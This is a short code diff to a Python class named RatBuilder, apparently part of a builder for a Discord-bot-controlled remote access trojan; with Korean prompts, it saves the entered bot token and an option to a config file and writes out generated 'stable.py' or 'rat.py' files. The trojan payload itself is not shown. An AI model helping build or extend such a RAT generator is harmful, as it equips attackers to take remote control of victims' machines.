@@ -535,15 +535,22 @@ class RatBuilder(PluginABC):
         token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 봇 토큰: ')
         await TokenValidator(token)
 
+        f = open("../../dist/rat/bot_conf.json", "w")
+        f.write(json.dumps({
+            "token": token,
+            "option": option
+        }))
+        f.close()
+
         if option == 1:
-            stable_f = open("stable.py", "w")
-            stable_f.write(stable)
+            f = open("stable.py", "w")
+            f.write(stable)
         elif option == 2:
-            stable_f = open("rat.py", "w")
-            stable_f.write(code)
+            f = open("rat.py", "w")
+            f.write(code)
         else:
             await importlib.import_module("main").Hydron()
 
         input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
-        stable_f.close()
+        f.close()
         await importlib.import_module("main").Hydron()
